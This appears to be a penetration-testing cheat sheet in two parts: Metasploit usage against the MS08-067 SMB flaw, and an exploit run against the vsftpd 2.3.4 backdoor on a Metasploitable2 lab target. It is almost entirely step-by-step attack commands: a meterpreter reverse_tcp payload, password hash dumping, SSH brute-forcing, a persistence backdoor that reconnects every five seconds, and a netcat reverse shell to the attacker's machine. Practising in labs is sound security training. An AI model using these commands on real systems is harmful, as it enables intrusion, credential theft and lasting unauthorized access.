### 1. **Search for Exploits**
   - Use `search` to find exploits related to a specific vulnerability or service:
     ```bash
     search ms08_067
     ```
   - This will list exploits related to the SMB vulnerability on older Windows versions.

### 2. **Use an Exploit**
   - Select an exploit:
     ```bash
     use exploit/windows/smb/ms08_067_netapi
     ```
   - Show required options:
     ```bash
     show options
     ```

### 3. **Set Target Options**
   - Define the target IP:
     ```bash
     set RHOSTS 192.168.1.100
     ```
   - Set payload:
     ```bash
     set PAYLOAD windows/meterpreter/reverse_tcp
     ```
   - Define local host (attacker machine):
     ```bash
     set LHOST 192.168.1.50
     ```

### 4. **Launch the Exploit**
   - Run the exploit:
     ```bash
     exploit
     ```
   - If successful, you will get a Meterpreter session.

### 5. **Post-Exploitation with Meterpreter**
   - Get system info:
     ```bash
     sysinfo
     ```
   - Get a shell:
     ```bash
     shell
     ```
   - Dump password hashes:
     ```bash
     hashdump
     ```

### 6. **Scanning with Metasploit**
   - Use `auxiliary/scanner` modules to find vulnerabilities:
     ```bash
     use auxiliary/scanner/portscan/tcp
     set RHOSTS 192.168.1.0/24
     run
     ```

### 7. **Brute-Forcing Logins**
   - Use brute-force modules to test for weak credentials:
     ```bash
     use auxiliary/scanner/ssh/ssh_login
     set RHOSTS 192.168.1.100
     set USERNAME admin
     set PASSWORD password123
     run
     ```

### 8. **Persistence & Maintaining Access**
   - Create a persistent backdoor:
     ```bash
     run persistence -U -i 5 -p 4444 -r 192.168.1.50
     ```
   - This sets up a backdoor that reconnects every 5 seconds.




----------------------------------------------------------------------------------

`Another example for port 21`

### **Step 1: Identify the Vulnerable Service on Port 21**
Since port **21** is for **FTP**, and you are using Metasploitable2, the likely vulnerable service is **vsftpd 2.3.4**.

- Check your **Nmap scan results**:
  ```bash
  nmap -p 21 -sV <target-IP>
  ```
  - If you see `vsftpd 2.3.4`, then you have found the vulnerable service.

### **Step 2: Search for an Exploit**
Use `searchsploit` to find an exploit for `vsftpd 2.3.4`:
```bash
searchsploit vsftpd 2.3.4
```
- This should return something like:
  ```
  vsftpd 2.3.4 - Backdoor Command Execution | exploits/unix/remote/49757.py
  ```
- The rightmost column shows the path to the exploit inside Kali.

### **Step 3: Examine the Exploit**
Open the script using nano:
```bash
nano /usr/share/exploitdb/exploits/unix/remote/49757.py
```
- Look for any parts that require **editing**, but most likely, this script takes the **target IP** as an argument.

### **Step 4: Run the Exploit**
- First, check what happens when you run it without arguments:
  ```bash
  python3 /usr/share/exploitdb/exploits/unix/remote/49757.py
  ```
  - It should show usage instructions.

- Now, run the script with the **target IP**:
  ```bash
  python3 /usr/share/exploitdb/exploits/unix/remote/49757.py <target-IP>
  ```
  - If successful, you should see:  
    ```
    Success, shell opened.
    ```

### **Step 5: Test the Shell**
- Run a command to confirm shell access:
  ```bash
  whoami
  ```
  - Expected output: `root` or another system user.
- Try listing files:
  ```bash
  ls -l
  ```

### **Bonus: Maintain Access**
If you want to establish a **reverse shell**:
```bash
nc -e /bin/bash <your-Kali-IP> 4444
```
Then on your **Kali machine**, set up a Netcat listener:
```bash
nc -lvnp 4444
```
